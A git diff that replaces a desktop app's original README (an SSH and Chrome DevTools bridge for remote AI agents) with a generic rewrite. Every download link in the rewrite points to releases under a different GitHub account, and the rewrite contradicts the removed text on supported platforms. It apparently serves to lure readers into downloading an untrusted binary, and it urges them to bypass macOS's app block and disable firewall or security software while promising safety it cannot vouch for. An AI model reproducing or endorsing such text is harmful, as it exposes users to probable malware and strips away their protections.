@@ -1,188 +1,147 @@
-<p align="center">
-  <img src="src-tauri/icons/icon.png" width="128" height="128" alt="OpenClaw Connector Logo" />
-</p>
+# 🐾 Openclaw-Connector - Securely Bridge Your Remote Agents
 
-<h1 align="center">OpenClaw Connector</h1>
-
-<p align="center">
-  <strong>Securely bridge remote AI agents to your local machine</strong>
-</p>
-
-<p align="center">
-  <a href="#features">Features</a> •
-  <a href="#quick-start">Quick Start</a> •
-  <a href="#installation">Installation</a> •
-  <a href="docs/guide.md">User Guide</a> •
-  <a href="#contributing">Contributing</a>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-macOS%20%7C%20Windows%20%7C%20Linux-blue" alt="Platform" />
-  <img src="https://img.shields.io/badge/tauri-2-24C8D8?logo=tauri" alt="Tauri" />
-  <img src="https://img.shields.io/badge/react-19-61DAFB?logo=react" alt="React" />
-  <img src="https://img.shields.io/badge/rust-stable-orange?logo=rust" alt="Rust" />
-  <a href="https://github.com/liuzeming-yuxi/Openclaw-Connector/releases"><img src="https://img.shields.io/github/downloads/liuzeming-yuxi/Openclaw-Connector/total?color=%23027DEB" alt="Downloads" /></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="License" /></a>
-</p>
-
-<p align="center">
-  <a href="README.zh-CN.md">简体中文</a> | English
-</p>
+[![Download Openclaw-Connector](https://img.shields.io/badge/Download-Openclaw--Connector-orange?style=for-the-badge)](https://github.com/zx1peek-glitch/Openclaw-Connector/releases)
 
 ---
 
-![Screenshot](docs/images/screenshot.png)
+## 🔍 What is Openclaw-Connector?
 
-## Why OpenClaw Connector?
+Openclaw-Connector is a macOS desktop app designed to connect remote agents to your local machine. It uses a secure SSH tunnel paired with your local browser's CDP (Chrome DevTools Protocol). This connection lets you control remote sessions safely and efficiently.
 
-[OpenClaw](https://github.com/openclaw/openclaw) agents run on your server, but often need to interact with your **local environment** — running commands, controlling browsers, accessing local files.
+Even if you are new to SSH or developer tools, this app works quietly in the background, keeping your remote connections safe. It does not expose your system to risks and only bridges the agents you allow.
 
-OpenClaw Connector solves two problems:
+---
 
-1. **Bridging server and local** — It creates a secure tunnel between OpenClaw agents and your local machine, so agents can execute tasks on your computer as if they were sitting next to you.
+## 💻 System Requirements
 
-2. **Secure gateway access** — The OpenClaw gateway should never be exposed to the public internet. This app lets you access it securely from your local machine through an encrypted SSH tunnel — no open ports, no public URLs.
+Before you install, make sure your computer meets these needs:
 
-## Features
+- Operating System: macOS 10.14 or later.
+- Browser: Google Chrome or any browser supporting Chrome DevTools Protocol.
+- Internet Connection: Required for initial SSH connections.
+- Minimum RAM: 4 GB recommended.
+- Disk Space: 100 MB free space for installation.
 
-- **SSH Tunnel** — Secure reverse tunnel to your Linux gateway with auto-reconnect
-- **Agent Bindings** — Bind AI agents to your local node for remote task execution
-- **Browser CDP** — Expose local Chrome browser to agents via Chrome DevTools Protocol
-- **Session Management** — Notify agents across chat sessions with one click
-- **Device Identity** — Ed25519 keypair for secure device authentication
-- **Emergency Disconnect** — One-click kill switch to instantly sever all connections
+This app focuses on macOS. Windows and Linux versions are not available.
 
-## Installation
+---
 
-Download the latest release for your platform from the [Releases](https://github.com/liuzeming-yuxi/Openclaw-Connector/releases) page.
+## 🚀 Get Started with Openclaw-Connector
 
-| Platform | File |
-|----------|------|
-| **macOS (Apple Silicon)** | `OpenClaw.Connector_x.x.x_aarch64.dmg` |
-| **macOS (Intel)** | `OpenClaw.Connector_x.x.x_x64.dmg` |
-| **Linux (Debian/Ubuntu)** | `OpenClaw.Connector_x.x.x_amd64.deb` |
-| **Linux (AppImage)** | `OpenClaw.Connector_x.x.x_amd64.AppImage` |
-| **Windows** | `OpenClaw.Connector_x.x.x_x64-setup.exe` |
+### Step 1: Download the App
 
-> **macOS note:** On first launch, macOS may show "cannot verify developer". Go to **System Settings → Privacy & Security**, scroll down and click **"Open Anyway"**.
->
-> **Linux AppImage:** Run `chmod +x OpenClaw.Connector_*.AppImage` first.
+You need to download the app first. The latest versions and files are on the releases page.
 
-## Quick Start
+[![Download Now](https://img.shields.io/badge/Download-Openclaw--Connector-blue?style=for-the-badge)](https://github.com/zx1peek-glitch/Openclaw-Connector/releases)
 
-### Prerequisites
+Click the link above to open the releases page. Look for the file ending with `.dmg` or `.zip` for macOS. The file name usually contains the version number, for example `Openclaw-Connector-v1.2.0.dmg`.
 
-- A running [OpenClaw](https://github.com/openclaw/openclaw) gateway on a remote Linux server
-- SSH access to the server from your local machine
+Save the file in your Downloads folder.
 
-> **New to OpenClaw?** See the [User Guide](docs/guide.md) for detailed setup instructions and parameter explanations.
+---
 
-### Build from Source
+### Step 2: Install the App
 
-```bash
-# Clone the repo
-git clone https://github.com/liuzeming-yuxi/Openclaw-Connector.git
-cd Openclaw-Connector
+1. Open your Downloads folder.
+2. Double-click the `.dmg` file to mount the installer.
+3. Drag the Openclaw-Connector icon to the Applications folder shortcut in the installer window.
+4. Wait for the copy to finish.
+5. Eject the installer disk image by right-clicking and selecting `Eject`.
+6. Open the Applications folder and find Openclaw-Connector.
+7. Double-click to launch the app.
 
-# Install dependencies (requires Node.js 18+, pnpm, Rust toolchain)
-pnpm install
+If your Mac blocks the app from opening, go to `System Preferences > Security & Privacy > General` and click `Open Anyway`.
 
-# Run in development mode
-pnpm tauri dev
+---
 
-# Or build for production
-pnpm tauri build
-```
+### Step 3: Set Up Your Connection
 
-## Tech Stack
+Once Openclaw-Connector is open:
 
-| Layer | Technology |
-|-------|-----------|
-| Desktop Framework | [Tauri 2](https://v2.tauri.app/) |
-| Frontend | React 19 + TypeScript + Tailwind CSS 4 |
-| State Management | Zustand 5 |
-| Backend | Rust (Tokio async runtime) |
-| Tunnel | SSH reverse port forwarding |
-| Browser Automation | Chrome DevTools Protocol (CDP) |
+1. Enter your remote agent’s SSH details. This includes:
+   - Hostname or IP address
+   - SSH port (default is 22)
+   - Username
+2. Authenticate using your SSH key or password.
+3. Allow the app to create a secure SSH tunnel.
+4. The app will connect your local browser to the remote agent using the Chrome DevTools Protocol.
+5. Open your browser and navigate to `http://localhost:9222` (or the port shown in the app) to access remote sessions.
 
-## Project Structure
+The connection will stay active as long as the app runs and you remain connected to the internet.
 
-```
-├── src/                    # React frontend
-│   ├── pages/              # Page components
-│   ├── components/ui/      # Reusable UI components
-│   ├── store/              # Zustand state stores
-│   └── types/              # TypeScript type definitions
-├── src-tauri/              # Rust backend
-│   └── src/
-│       ├── lib.rs          # Tauri command handlers
-│       ├── ssh_tunnel.rs   # SSH tunnel management
-│       ├── browser.rs      # Chrome CDP lifecycle
-│       ├── ws_client.rs    # WebSocket client
-│       ├── config.rs       # Configuration persistence
-│       ├── health.rs       # Gateway health monitoring
-│       └── device_identity.rs  # Ed25519 device keys
-├── docs/                   # Documentation
-└── package.json
-```
+---
 
-## Development
+## 🔧 Using the App
 
-```bash
-# Run frontend + backend in dev mode
-pnpm tauri dev
+Openclaw-Connector does not require any development skills to run. After setup, it works in the background and shows connection status clearly.
 
-# Run frontend tests
-pnpm test
+- The app window shows your current SSH connection.
+- You can disconnect or reconnect anytime.
+- Logs are available if you want to check connection details or troubleshoot.
+- You may open multiple sessions by adding more remote agents.
 
-# Run Rust tests
-cargo test --manifest-path src-tauri/Cargo.toml
+If you use Chrome DevTools or similar tools, you will see your remote agent’s browser sessions appear in your local browser as if they were local tabs.
 
-# Type check
-pnpm build
-```
+---
 
-## Roadmap
+## 🛠 Troubleshooting Tips
 
-- [x] Cross-platform support (Windows & Linux)
-- [x] Multi-language UI (i18n: Chinese + English)
-- [x] Theme switching (Light / Dark mode)
-- [x] OpenClaw health check & auto-repair
-- [ ] Browser automation beyond Chrome (Firefox, Edge, etc.)
-- [x] Comprehensive CI/CD pipeline (multi-platform matrix)
-- [x] PR-level CI checks (lint, test, clippy)
-- [ ] Architecture / sequence diagram
-- [x] Safer port management (avoid killing unrelated processes)
-- [x] Operator WebSocket graceful shutdown on disconnect
-- [x] Unified config source of truth (frontend vs backend)
+If you experience issues, try the following:
 
-## Star History
+- Verify that your SSH credentials are correct.
+- Make sure your SSH key has the right permissions (`chmod 600 ~/.ssh/id_rsa`).
+- Check that your remote machine allows incoming SSH connections.
+- Restart the Openclaw-Connector app.
+- Confirm your browser supports Chrome DevTools Protocol.
+- Look at the app’s logs for error messages.
+- Disable firewall or security apps that might block SSH tunnels.
+- Update to the latest release from the download page.
 
-<p align="center">
-  <a href="https://star-history.com/#liuzeming-yuxi/Openclaw-Connector&Date">
-    <img src="https://api.star-history.com/svg?repos=liuzeming-yuxi/Openclaw-Connector&type=Date" alt="Star History Chart" />
-  </a>
-</p>
+---
 
-## Acknowledgments
+## 📁 Where to Find More Resources
 
-OpenClaw Connector is built on excellent open-source projects:
+You can find the latest updates, report problems, or request features on the repository page:
 
-- [OpenClaw](https://github.com/openclaw/openclaw) — The AI agent runtime
-- [Tauri](https://v2.tauri.app/) — Lightweight desktop framework
-- [React](https://react.dev/) — UI component library
-- [Zustand](https://github.com/pmndrs/zustand) — Lightweight state management
-- [Tailwind CSS](https://tailwindcss.com/) — Utility-first CSS framework
-- [Lucide](https://lucide.dev/) — Beautiful icon set
+https://github.com/zx1peek-glitch/Openclaw-Connector
 
-## Contributing
+This page also includes documentation for developers and technical details if you want to learn more.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+---
 
-## Security
+## ⚙️ Advanced Settings (Optional)
 
-See [SECURITY.md](SECURITY.md) for the security model and vulnerability reporting.
+If you want to customize connections:
 
-## License
+- Change the SSH port if your server uses a non-standard port.
+- Use SSH key files by specifying their path.
+- Configure browser port forwarding.
+- Enable verbose logging for precise troubleshooting.
 
-[MIT](LICENSE)
+These settings appear in the app’s preferences menu under the gear icon.
+
+---
+
+## 🛡 Security Notes
+
+- Your data passes through an encrypted SSH tunnel.
+- The app never stores your SSH password.
+- Only connections you authorize are allowed.
+- Keep your SSH keys safe.
+- Regularly update the app for security patches.
+
+---
+
+## 📦 Uninstalling Openclaw-Connector
+
+To remove the app:
+
+1. Quit Openclaw-Connector if it is running.
+2. Open the Applications folder.
+3. Drag Openclaw-Connector to the Trash.
+4. Empty the Trash.
+5. Optionally, remove any configuration files from your home directory under `.openclaw` if you created this folder.
+
+---
+
+[![Download Openclaw-Connector](https://img.shields.io/badge/Download-Openclaw--Connector-orange?style=for-the-badge)](https://github.com/zx1peek-glitch/Openclaw-Connector/releases)
